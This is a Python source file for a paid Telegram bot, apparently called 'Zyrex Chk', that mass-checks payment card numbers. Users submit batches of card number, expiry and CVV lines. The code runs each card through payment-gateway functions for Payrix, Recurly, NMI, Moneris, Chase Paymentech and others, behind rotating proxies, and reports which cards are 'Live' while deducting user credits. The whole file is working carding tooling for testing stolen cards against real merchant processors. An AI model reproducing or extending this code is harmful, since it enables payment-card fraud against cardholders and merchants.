from pyrogram.client import Client
from pyrogram import filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from functions.database import Database
from functions.functions import (
    get_bin_info,
    GetCC,
    ProxyRandomFromFile,
    get_text_from_pyrogram,
    Symbol,
    AntiSpam
)
from functions.generator_cc import Utils as Gen
from functions.variables import PREFIXES
from time import perf_counter
from functions.gates_for_mass import (
    gateway_stripe3, chase2, nmi1, authnet,
    authnet555, b3gateavs, payrix, recurly3,
    cyberchaseccn, recurlyccn3, stripeauth, payflowccn1,
    nmi, moneris, chaseccnauth, autoshopify,
    recurly_gift, ki
)
import asyncio
from concurrent.futures import ThreadPoolExecutor
import threading
from queue import Queue
import re
import datetime
from datetime import date
import time
import traceback
# Botones y mensajes de error (sin cambios)
button = InlineKeyboardMarkup([[InlineKeyboardButton(text="Buy Chk", url="https://t.me/tocandotee"),
                                 InlineKeyboardButton(text="Reference", url="https://t.me/ZyrexRefes")]])

button1 = InlineKeyboardMarkup([[InlineKeyboardButton(text="Credits for $5", url="https://t.me/tocandotee"),
                                  InlineKeyboardButton(text="Reference", url="https://t.me/ZyrexRefes")]])

msg_error = """<b>
<code>[<a href='t.me/tocandotee'>✮</a>]</code> Please Put <code>10 (CCS)</code> In Mass Checking
</b>"""

# Variable global para almacenar resultados
results_queue = Queue()

# Agregar constante para número máximo de reintentos
MAX_RETRIES = 3

# Variable para almacenar información de los usuarios
USERS_INFO = {}

@staticmethod
def get_cc(text: str):
    try:
        input_msg = text.strip()
        input_numbers = re.findall(r'\d+', input_msg)

        current_year = datetime.datetime.now().year

        if not input_numbers: 
            return False
            
        cc = input_numbers[0]

        if len(input_numbers) >= 4:
            mes = input_numbers[1]
            ano = input_numbers[2]
            cvv = input_numbers[3]

            if (cc.isdigit() and 14 <= len(cc) <= 16 and
                mes.isdigit() and 1 <= int(mes) <= 12 and
                ano.isdigit() and (current_year <= int(ano) <= 2099 or (21 <= int(ano) <= 99 and len(ano) == 2)) and
                cvv.isdigit() and len(cvv) <= 4):
                if len(ano) == 2:
                    ano = "20"+ano
                return cc, mes, ano, cvv
            else:
                return False
        else:
            return False
        
    except:
        return False

def luhn(card: str) -> bool:
    return not sum(int(x) * (1 + i % 2) % 10 + (int(x) * (1 + i % 2) // 10) for i, x in enumerate(card[::-1])) % 10

async def process_cc(cc):
    # Limpiar la tarjeta de espacios y caracteres no deseados
    cc = cc
    if not any(char.isdigit() for char in cc):
        return None
        
    cc_data = await GetCC(cc)
    if not cc_data:
        return None
    
    card = cc_data[0]
    bin_info = await get_bin_info(card[:6])
    if bin_info:
        return (cc_data, bin_info)
    return None

async def process_card_async(cc, user_id, gate, proxy):
    retries = 0
    max_retries = 3
    card, mes, ano, cvv = cc
    start_time = time.perf_counter()
    
    while retries < max_retries:
        try:
            result = await gate(card, mes, ano, cvv, proxy)
            
            if isinstance(result, tuple):
                status, msg = result
            else:
                status = result.get("status", "Error")
                msg = result.get("response", "Unknown Error")

            if status.lower() not in ["error", "unknown error"]:
                with Database() as db:
                    if "approved" in status.lower():
                        db.remove_credits(user_id, credits=3)
                        return ("approved", 3, card, mes, ano, cvv, status, msg)
                    elif "declined" in status.lower():
                        db.remove_credits(user_id, credits=1)
                        return ("declined", 1, card, mes, ano, cvv, status, msg)
                break

            retries += 1
            if retries < max_retries:
                await asyncio.sleep(2)
                continue
            
            return ("error", 0, card, mes, ano, cvv, status, msg)
            
        except Exception as e:
            retries += 1
            if retries < max_retries:
                await asyncio.sleep(2)
                continue
            return ("error", 0, card, mes, ano, cvv, "Error", str(e))

@Client.on_message(filters.command(["psg", "alv","am","lel","kev","auth","lc","mm","ps","nn","ta","qq","xx","kk","ee"], PREFIXES)) # type: ignore
async def mass_checker(client: Client, m: Message):
    try:
        user_id = m.from_user.id
        
        # Verificación inicial con la base de datos
        with Database() as main_db:
            if not main_db.is_premium(user_id):
                return await m.reply("<b>You Don't Have A Membership !! Buy Membership @tocandotee</b>",
                                      reply_markup=button, quote=True)
            user_info = main_db.get_info_user(user_id)
            credits = user_info.get("CREDITS", 0)
            rol = user_info["MEMBERSHIP"]

        if credits < 4:
            return await m.reply("<b>More than 2 credits are needed to be able to use this command.</b>",
                                  reply_markup=button1, quote=True)

        # Verificar si es la primera ejecución del comando
        if user_id not in USERS_INFO:
            USERS_INFO[user_id] = {"used_command": 0}

        # Incrementar el contador de uso del comando
        USERS_INFO[user_id]["used_command"] += 1

        # Aplicar antispam solo si el usuario ha usado el comando al menos una vez
        if USERS_INFO[user_id]["used_command"] > 1:
            antispam = await AntiSpam(user_id, is_mass=True, membership=user_info["MEMBERSHIP"])
            if antispam:
                return await m.reply(f"<b>Please Wait [<code>{antispam}s</code>] After Checking ⚠️</b>")

        # Obtener texto de la tarjeta (ya sea de reply o mensaje directo)
        if m.reply_to_message and m.reply_to_message.text:
            text = m.reply_to_message.text
        else:
            text = await get_text_from_pyrogram(m)
            
        if len(text.split("\n")) < 2:
            return await m.reply(msg_error, reply_markup=button, quote=True)

        # Obtener el gate correspondiente
        cmd = m.command[0].lower()
        gates = {
            "alv": (payrix, "Payrix Charged"),
            "lel": (recurly3, "Recurly CCN"),
            "kev": (recurlyccn3, "Recurly CCN"),
            "qq": (nmi, "NMI CCN"),
            "xx": (moneris, "Moneris CCN"),
            "kk": (chaseccnauth, "Chase Paymentech")
        }

        if cmd not in gates:
            return await m.reply(msg_error, reply_markup=button, quote=True)

        gate, gate_name = gates[cmd]

        # Detección de líneas sin strip
        lines = text.split('\n')
        ccs = []
        
        for line in lines:
            if re.search(r'\d{13,16}\|.+\|.+\|.+', line):
                ccs.append(line)
        
        # Asegurar que tomamos exactamente 10 tarjetas si hay disponibles
        ccs = ccs[:10]
        
        if not ccs:
            return await m.reply(msg_error, reply_markup=button, quote=True)

        results = await asyncio.gather(*[process_cc(cc) for cc in ccs])
        ccs_findeds = []
        bins = {}

        for result in results:
            if result:
                cc_data, bin_info = result
                ccs_findeds.append(cc_data)
                bins[cc_data[0][:6]] = bin_info

        # Verificar que tengamos tarjetas válidas
        if not ccs_findeds:
            return await m.reply(msg_error, reply_markup=button, quote=True)

        ini = perf_counter()
        symbol = await Symbol()
        
        msg_bot = await m.reply(
            f"""♯𝗭𝘆𝗿𝗲𝘅 𝗖𝗵𝗸 | Mass Checker
━━━━━━━━━━━━━━━━━━━━
<a href="https://t.me/zyrexnews">ゕ</a>﹒Total Cards: <code>{len(ccs_findeds)}</code>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Gateway: <code>{gate_name}</code>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Status: <b>Processing...</b>
━━━━━━━━━━━━━━━━━━━━
࿔ Bot Version: 1.0""",
            reply_markup=button,
            quote=True,
        )

        # Procesar las tarjetas con el nuevo sistema de reintentos
        tasks = []
        for cc in ccs_findeds:
            proxy = await ProxyRandomFromFile()
            task = asyncio.create_task(process_card_async(cc, user_id, gate, proxy))
            tasks.append(task)
        
        # Esperar a que todas las tareas se completen
        results = await asyncio.gather(*tasks)

        # Procesar resultados
        text_ccs = ""
        errors = approveds = deads = creditos_removidos = 0

        for result_type, credits_used, card, mes, ano, cvv, status, msg in results:
            if result_type == "approved":
                approveds += 1
                creditos_removidos += credits_used
            elif result_type == "declined":
                deads += 1
                creditos_removidos += credits_used
            else:
                errors += 1

            text_ccs += f"""<a href="https://t.me/zyrexnews">ゕ</a>﹒Card: <code>{card}|{mes}|{ano}|{cvv}</code>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Status: <b>{status}</b>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Response: <code>{msg}</code>
━━━━━━━━━━━━━━━━━━━━
"""

        # Actualizar créditos finales
        with Database() as final_db:
            final_credits = final_db.get_info_user(user_id).get("CREDITS", 0)

        # Resultados finales
        final = perf_counter() - ini
        
        text = f"""♯𝗭𝘆𝗿𝗲𝘅 𝗖𝗵𝗸 | Mass Results
━━━━━━━━━━━━━━━━━━━━
{text_ccs}<a href="https://t.me/zyrexnews">ゕ</a>﹒Req: @{m.from_user.username} [{rol}]
<a href="https://t.me/zyrexnews">ゕ</a>﹒Gateway: <code>{gate_name}</code>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Time: <code>{final:0.4}s</code>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Results: Live ✅ <code>[{approveds}]</code> | Dead ❌ <code>[{deads}]</code> | Error ⚠️ <code>[{errors}]</code>
<a href="https://t.me/zyrexnews">ゕ</a>﹒Credits Left: <code>{final_credits}</code> (-{creditos_removidos})
━━━━━━━━━━━━━━━━━━━━
࿔ Bot Version: 1.0"""

        await msg_bot.edit(text, reply_markup=button)

    except Exception as e:
        # Imprimir el error en la consola con más detalles
        print(f"Error en mass checker: {str(e)}")
        # También puedes imprimir el traceback para más información
        traceback.print_exc()